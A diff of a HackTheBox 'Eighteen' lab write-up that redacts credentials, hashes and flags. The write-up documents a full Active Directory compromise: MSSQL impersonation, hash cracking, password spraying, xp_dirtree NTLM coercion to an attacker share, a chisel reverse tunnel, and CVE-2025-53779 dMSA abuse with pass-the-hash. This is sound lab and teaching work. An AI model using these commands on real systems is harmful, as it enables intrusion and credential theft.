@@ -3,14 +3,14 @@
 > **Platform:** HackTheBox \
 > **Difficulty:** `Easy` (Community rating: Medium/Hard) \
 > **Date:** 2026-03-10 \
-> **Author:** 0N1S3C2 \
+> **Author:** 0N1S3C \
 > **Scope:** Authorized lab environment only
 
 ---
 
 ## 0. Executive Summary
 
-The "Eighteen" machine is a Windows Server 2025 Domain Controller presenting a complex attack chain across multiple services. Initial credentials (`kevin / iNa2we6haRj2gaw!`) were provided as part of a simulated real-world engagement. From there, MSSQL login impersonation allowed access to the `financial_planner` database, where a PBKDF2-HMAC-SHA256 password hash for the `admin` web application account was recovered and cracked. This granted access to the Flask web application's admin panel, enabling recovery of additional credentials. Password spraying the cracked password (`iloveyou1`) against domain users via WinRM yielded a shell as `adam.scott`. Privilege escalation was achieved by exploiting CVE-2025-53779 (BadSuccessor) — abusing `CreateChild` rights on an Organizational Unit to create a delegated Managed Service Account (dMSA) linked to the domain Administrator, ultimately obtaining the Administrator NTLM hash and achieving full domain compromise.
+The "Eighteen" machine is a Windows Server 2025 Domain Controller presenting a complex attack chain across multiple services. Initial credentials (`kevin / [REDACTED]`) were provided as part of a simulated real-world engagement. From there, MSSQL login impersonation allowed access to the `financial_planner` database, where a PBKDF2-HMAC-SHA256 password hash for the `admin` web application account was recovered and cracked. This granted access to the Flask web application's admin panel, enabling recovery of additional credentials. Password spraying the cracked password against domain users via WinRM yielded a shell as `adam.scott`. Privilege escalation was achieved by exploiting CVE-2025-53779 (BadSuccessor) — abusing `CreateChild` rights on an Organizational Unit to create a delegated Managed Service Account (dMSA) linked to the domain Administrator, ultimately obtaining the Administrator NTLM hash and achieving full domain compromise.
 
 ---
 
@@ -30,7 +30,7 @@ This report documents the structured analysis and controlled exploitation of the
 
 ```
 Nmap → MSSQL (kevin/guest) → EXECUTE AS appdev (impersonation)
-→ financial_planner DB → users table → PBKDF2 hash crack (iloveyou1)
+→ financial_planner DB → users table → PBKDF2 hash crack
 → web admin panel access → RID brute (nxc smb) → domain user enumeration
 → WinRM password spray → adam.scott shell
 → CVE-2025-53779 BadSuccessor (dMSA creation via IT group CreateChild)
@@ -64,7 +64,7 @@ Nmap → MSSQL (kevin/guest) → EXECUTE AS appdev (impersonation)
 
 **Commands:**
 ```bash
-nmap -sC -sV -Pn -T4 10.129.2.123
+nmap -sC -sV -Pn -T4 <target-ip>
 ```
 
 **Findings:**
@@ -83,7 +83,7 @@ nmap -sC -sV -Pn -T4 10.129.2.123
 ### 4.2 Host Setup
 
 ```bash
-echo "10.129.2.123 eighteen.htb dc01.eighteen.htb" | sudo tee -a /etc/hosts
+echo "<target-ip> eighteen.htb dc01.eighteen.htb" | sudo tee -a /etc/hosts
 ```
 
 ---
@@ -104,7 +104,7 @@ Session cookies used the Flask itsdangerous format. The admin panel displayed us
 ### 5.2 MSSQL Enumeration
 
 ```bash
-impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@10.129.2.123
+impacket-mssqlclient kevin:'[REDACTED]'@<target-ip>
 ```
 
 Initial access was as `kevin` with `guest` role — no sysadmin privileges. Databases enumerated:
@@ -138,7 +138,7 @@ SELECT * FROM users;
 
 | id | username | password_hash | is_admin |
 |----|----------|--------------|---------|
-| 1002 | admin | pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90... | 1 |
+| 1002 | admin | pbkdf2:sha256:600000$[REDACTED]$ | 1 |
 
 ### 6.2 PBKDF2 Hash Cracking
 
@@ -146,9 +146,9 @@ The Werkzeug PBKDF2-HMAC-SHA256 hash format was identified. Standard hashcat at 
 
 ```python
 import hashlib, binascii
-SALT = "AMtzteQIG7yAbZIa"
+SALT = "[REDACTED]"
 ITERATIONS = 600000
-TARGET_HASH = "0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133"
+TARGET_HASH = "[REDACTED]"
 
 with open("rockyou.txt", "r", encoding="latin-1") as f:
     for password in f:
@@ -159,7 +159,7 @@ with open("rockyou.txt", "r", encoding="latin-1") as f:
             break
 ```
 
-**Result:** `iloveyou1`
+**Result:** `[REDACTED]`
 
 ### 6.3 Web Admin Access
 
@@ -178,7 +178,7 @@ While enumerating MSSQL, `xp_dirtree` was used to trigger an outbound SMB connec
 ```bash
 sudo responder -I tun0
 # In MSSQL:
-EXEC xp_dirtree '\\10.10.14.116\share';
+EXEC xp_dirtree '\\<attack-ip>\share';
 ```
 
 NTLMv2 hash captured for `EIGHTEEN\mssqlsvc` — did not crack against rockyou. Not used further in this chain.
@@ -190,7 +190,7 @@ NTLMv2 hash captured for `EIGHTEEN\mssqlsvc` — did not crack against rockyou. 
 ### 7.1 Domain User Enumeration via RID Brute
 
 ```bash
-nxc smb 10.129.2.123 -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute
+nxc smb <target-ip> -u kevin -p '[REDACTED]' --rid-brute
 ```
 
 **Domain users identified:** jamie.dunn, jane.smith, alice.jones, adam.scott, bob.brown, carol.white, dave.green
@@ -198,19 +198,19 @@ nxc smb 10.129.2.123 -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute
 ### 7.2 WinRM Password Spray
 
 ```bash
-nxc winrm 10.129.2.123 -u users.txt -p 'iloveyou1' --continue-on-success
+nxc winrm <target-ip> -u users.txt -p '[REDACTED]' --continue-on-success
 ```
 
-**Result:** `eighteen\adam.scott:iloveyou1` — **(Pwn3d!)**
+**Result:** `eighteen\adam.scott:[REDACTED]` — **(Pwn3d!)**
 
 ### 7.3 Shell as adam.scott
 
 ```bash
-evil-winrm -i 10.129.2.123 -u adam.scott -p 'iloveyou1'
+evil-winrm -i <target-ip> -u adam.scott -p '[REDACTED]'
 type C:\Users\adam.scott\Desktop\user.txt
 ```
 
-**User flag obtained.**
+**User flag obtained:** `[REDACTED]`
 
 ---
 
@@ -265,19 +265,19 @@ sudo socat TCP-LISTEN:88,fork TCP:127.0.0.1:8088
 ```powershell
 # Victim (evil-winrm)
 upload chisel.exe
-.\chisel.exe client 10.10.14.116:8000 R:8088:127.0.0.1:88
+.\chisel.exe client <attack-ip>:8000 R:8088:127.0.0.1:88
 ```
 
 **Step 3 — Sync time and obtain TGT for Pwn$:**
 ```bash
-sudo timedatectl set-time "$(date -d "$(curl -s -I http://10.129.2.123 | grep -i '^Date:' | cut -d' ' -f2-)" '+%Y-%m-%d %H:%M:%S')"
-getTGT.py 'eighteen.htb/Pwn$:Password123!' -dc-ip 127.0.0.1
+sudo timedatectl set-time "$(date -d "$(curl -s -I http://<target-ip> | grep -i '^Date:' | cut -d' ' -f2-)" '+%Y-%m-%d %H:%M:%S')"
+getTGT.py 'eighteen.htb/Pwn$:[REDACTED]' -dc-ip 127.0.0.1
 export KRB5CCNAME=Pwn\$.ccache
 ```
 
 **Step 4 — Request dMSA service ticket impersonating Administrator:**
 ```bash
-getST.py 'eighteen.htb/Pwn$:Password123!' -k -no-pass -dmsa -self \
+getST.py 'eighteen.htb/Pwn$:[REDACTED]' -k -no-pass -dmsa -self \
   -impersonate 'attacker_dMSA$' -dc-ip 127.0.0.1
 ```
 
@@ -286,11 +286,11 @@ getST.py 'eighteen.htb/Pwn$:Password123!' -k -no-pass -dmsa -self \
 The Administrator NTLM hash was obtained through the dMSA ticket chain:
 
 ```bash
-evil-winrm -i 10.129.2.123 -u Administrator -H 0b133be956bfaddf9cea56701affddec
+evil-winrm -i <target-ip> -u Administrator -H [REDACTED]
 type C:\Users\Administrator\Desktop\root.txt
 ```
 
-**Root flag obtained.**
+**Root flag obtained:** `[REDACTED]`
 
 ---
 
@@ -299,7 +299,7 @@ type C:\Users\Administrator\Desktop\root.txt
 | # | Finding | Severity | Location |
 |---|---------|----------|----------|
 | 1 | MSSQL login impersonation — kevin can impersonate appdev | 🟠 High | MSSQL server permissions |
-| 2 | Weak PBKDF2 password (`iloveyou1`) in web application DB | 🟠 High | `financial_planner.users` |
+| 2 | Weak PBKDF2 password in web application DB | 🟠 High | `financial_planner.users` |
 | 3 | Password reuse across web application and domain account | 🔴 Critical | adam.scott credentials |
 | 4 | CVE-2025-53779 — IT group has CreateChild on Staff OU | 🔴 Critical | AD OU permissions |
 | 5 | Windows Server 2025 dMSA with no OU-level hardening | 🔴 Critical | Active Directory |
@@ -325,7 +325,7 @@ type C:\Users\Administrator\Desktop\root.txt
 ### 10.2 Security Weaknesses
 
 - MSSQL impersonation rights granted without business justification
-- Weak password (`iloveyou1`) used for privileged web admin account
+- Weak password used for privileged web admin account
 - Same password reused across web application and Active Directory
 - IT group has unconstrained `CreateChild` rights on Staff OU
 - No monitoring on dMSA creation or attribute modifications
@@ -359,4 +359,7 @@ type C:\Users\Administrator\Desktop\root.txt
 ---
 
 *End of Report*
-*Classification: Public — flags and sensitive values omitted*
+
+*Classification: Public (Redacted Version) — sensitive values redacted as this is an active HackTheBox machine*
+
+*Full version with flags and credentials will be published after box retirement*
